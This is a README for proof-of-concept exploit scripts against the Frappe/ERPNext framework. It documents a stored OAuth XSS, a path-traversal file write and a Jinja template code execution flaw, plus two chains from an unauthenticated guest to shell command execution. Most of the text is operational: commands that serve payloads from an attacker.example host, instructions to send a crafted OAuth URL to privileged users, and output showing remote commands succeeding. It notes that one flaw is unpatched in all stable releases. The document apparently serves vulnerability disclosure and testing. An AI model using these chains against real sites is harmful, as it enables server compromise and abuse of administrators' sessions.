# FRAPPE-02, FRAPPE-03 and FRAPPE-04 PoCs

These standard-library clients reproduce three Frappe vulnerabilities and both
guest-to-command-execution chains.

| File | Result |
| --- | --- |
| `frappe02_oauth_stored_xss.py` | registers a stored OAuth XSS payload |
| `frappe03_genericode_file_create.py` | writes attacker-supplied Genericode XML to an attacker-selected path |
| `frappe04_safe_jinja_rce.py` | writes a file-backed Python controller through Jinja and returns command output |
| `frappe02_04_browser_rce.py` | chains guest OAuth XSS through a Website Manager session into FRAPPE-04 |
| `frappe02_03_04_browser_rce.py` | chains guest OAuth XSS through a System Manager session into FRAPPE-03 and FRAPPE-04 |

All scripts require Python 3.10 or newer and the standard library only (they
share `frappe_chain_common.py`). The browser chains host their JavaScript payload
on the attacker's server and print the OAuth URL to send to the target user. The
attacker never needs that user's password or session.

Each script prints a banner and coloured `[*]`/`[+]`/`[!]`/`[-]` progress to
stderr, and writes its result — the authorize URL, the written file, or the
command output — to stdout. Pass `--no-color` (or set `NO_COLOR=1`) to disable
colour, and see `--help` on any script for the finding it exploits and a worked
example.

## Guest to command execution

The shorter chain needs:

- dynamic OAuth client registration
- a Website Manager, or a role that can create dynamic Web Pages, who opens the OAuth URL
- a browser-reachable attacker URL that the target's CSP permits
- a writable installed-app `www` directory shared with the serving worker

Run the attacker server with the target origin, its public URL, and the server
path to an installed app's `www` directory:

```console
python3 frappe02_04_browser_rce.py \
  --url https://frappe.example.test \
  --public-url https://attacker.example \
  --www-path ../apps/custom_app/custom_app/www
```

```text
 [*] serving payload from https://attacker.example
 [+] registered guest OAuth client 4d9e2a7c1b
 [*] send this authorize URL to a Website Manager (no Allow click needed):
https://frappe.example.test/api/method/frappe.integrations.oauth2.authorize?client_id=4d9e2a7c1b&scope=all&response_type=code&redirect_uri=https%3A%2F%2Fattacker.example%2Fq7Xk2p%2Fcallback&state=Mv3nRt8w
 [*] waiting up to 300s for the victim to open it
 [+] browser loaded the payload from attacker.example
 [+] browser completed the authenticated write
 [+] browser stage complete; reading command output from the target
 [+] remote command exited with status 0
  ------------------------------------------------------------
uid=1000(frappe) gid=1000(frappe) groups=1000(frappe)
```

Send the printed OAuth URL to a Website Manager. Opening it is enough. The
stored script creates the dynamic page, writes a fresh HTML route and Python
controller, then the attacker process requests that route and prints the output
of `id`. Pass `--command 'COMMAND'` to run another shell command.

The ERPNext variant needs a System Manager, or an equivalent role with Code
List import permission:

```console
python3 frappe02_03_04_browser_rce.py \
  --url https://frappe.example.test \
  --public-url https://attacker.example \
  --www-path ../../../../apps/custom_app/custom_app/www
```

```text
 [*] serving payload from https://attacker.example
 [+] registered guest OAuth client b1e8f0a62d
 [*] send this authorize URL to a System Manager (no Allow click needed):
https://frappe.example.test/api/method/frappe.integrations.oauth2.authorize?client_id=b1e8f0a62d&scope=all&response_type=code&redirect_uri=https%3A%2F%2Fattacker.example%2Fh4Lm9s%2Fcallback&state=Wp2kZx7q
 [*] waiting up to 300s for the victim to open it
 [+] browser loaded the payload from attacker.example
 [+] browser completed the authenticated write
 [+] browser stage complete; reading command output from the target
 [+] remote command exited with status 0
  ------------------------------------------------------------
uid=1000(frappe) gid=1000(frappe) groups=1000(frappe)
```

Here `--www-path` is interpreted from the site's `private/files` directory
because FRAPPE-03 plants the Jinja page through filename traversal. Adjust the
leading path components to match the target's Bench layout.

For HTTPS targets, the payload URL must also use HTTPS. Supply `--certfile` and
`--keyfile` when the client terminates TLS itself, or put it behind a TLS reverse
proxy.

## Standalone vulnerabilities

FRAPPE-02 requires no Frappe credentials. Its default payload is
`alert(document.domain)`:

```console
python3 frappe02_oauth_stored_xss.py --url https://frappe.example.test
```

```text
 [*] registering a Guest OAuth client carrying the default alert payload
 [+] registered OAuth client 7f3a9c1e5b
 [*] send the authorize URL below to a logged-in Desk User; the payload runs
 [*] when the consent page renders, before any Allow click
https://frappe.example.test/api/method/frappe.integrations.oauth2.authorize?client_id=7f3a9c1e5b&scope=all&response_type=code&redirect_uri=https%3A%2F%2Fexample.invalid%2Ffrappe02-callback&state=Zr8mKq2vN4pL
```

Use `--javascript 'ASCII_CODE'` for short inline JavaScript or
`--script-url https://attacker.example/payload.js` for an external payload. The
stored OAuth client name is limited to 140 characters.

FRAPPE-03 requires an attacker-controlled System Manager account, or a custom
role with permission to create the imported Code List:

```console
FRAPPE_POC_PASSWORD='account password' \
  python3 frappe03_genericode_file_create.py \
  --url https://frappe.example.test \
  --username system-manager@example.test \
  --remote-path '../../../../sites/assets/frappe03.xml' \
  --xml-file payload.xml \
  --retrieve-url /assets/frappe03.xml
```

```text
 [+] authenticated as system-manager@example.test
 [*] server-side destination: ../../../../sites/assets/frappe03.xml
 [*] uploading 281 attacker-supplied XML bytes
 [!] the selected destination may create or overwrite server files
 [!] Genericode import: HTTP 417
 [*] reading the written file back through /assets/frappe03.xml
 [+] recovered 281 bytes from the written file
  ------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<CodeList>
<Identification>
<ShortName>Country codes</ShortName>
<Version>1</Version>
<CanonicalUri>urn:example:country-codes</CanonicalUri>
</Identification>
<CanonicalVersionUri>urn:example:country-codes:1</CanonicalVersionUri>
</CodeList>
```

`payload.xml` must be well-formed Genericode with nonempty `ShortName`,
`Version`, `CanonicalUri`, and `CanonicalVersionUri` values. Use `--xml` for
literal XML or `--xml-file -` to read it from stdin. `--retrieve-url` is
optional and prints the real response body when the selected path is reachable
over HTTP.

**Warning:** `--remote-path` is a server-side destination and may create or
overwrite files writable by the Frappe worker. Frappe normally adds a suffix
when an existing filename collides, so overwriting every chosen file is not
reliable. The import commonly returns HTTP 417 after the filesystem write
because later `File` validation rejects the escaped path. That response alone
does not prove the file was written.

FRAPPE-04 requires Website Manager or equivalent Web Page authoring permission:

```console
FRAPPE_POC_PASSWORD='account password' \
  python3 frappe04_safe_jinja_rce.py \
  --url https://frappe.example.test \
  --username website-manager@example.test \
  --www-path ../apps/custom_app/custom_app/www
```

```text
 [+] authenticated as website-manager@example.test
 [+] created staging Web Page 'frappe04-8c2a1f9d-stage'
 [*] writing controller through the Jinja save() sink to /frappe04_8c2a1f9d_exec
 [+] controller planted; requesting the execution route
 [+] remote command exited with status 0
  ------------------------------------------------------------
uid=1000(frappe) gid=1000(frappe) groups=1000(frappe)
```

Both authenticated standalone clients also accept an existing `--sid` with its
`--csrf-token`.

## Persistent effects and cleanup

These clients change server state and none of them removes what it creates, so plan the cleanup before you run one.

Depending on which client you run, the following can remain afterwards:

- an OAuth Client row whose application name holds the stored payload, created
  by the Guest registration step in FRAPPE-02 and both chains;
- a Web Page document, published and dynamic, created by the FRAPPE-02 to
  FRAPPE-04 route and by the standalone FRAPPE-04 client;
- a Code List document and a File row from the FRAPPE-03 import, where the
  database side can roll back while the escaped file stays on disk;
- an XML file written outside managed storage by FRAPPE-03, at the exact
  `--remote-path` you chose;
- a `.html` page and a colocated `.py` controller under the `--www-path` you
  chose, named after the random execution route the client prints;
- Email Queue, Version, Deleted Document, Activity Log and naming-series rows
  that Frappe writes as a side effect of the above.

The clients print the execution route and the written file paths on success.
Remove those two files first, because they are the ones that keep executing.
Delete the OAuth Client, Web Page, Code List and File documents through Desk or
the REST API afterwards. An HTTP 404 on a route does not prove the files are
gone from disk, so confirm removal on the filesystem rather than over HTTP.

If a run fails partway, treat every effect above as possibly present. The
stages are not transactional and an early failure can still leave the OAuth
Client or the staged Web Page behind.

## Version scope

The vulnerable baseline was Frappe 16.29.0, with ERPNext 16.30.0 for FRAPPE-03. Frappe 16.33.1 and 15.120.1 close FRAPPE-04 and 16.34.0 and 15.121.0 close FRAPPE-03, so both chains need a site below those versions. FRAPPE-02 is still present in every stable release.
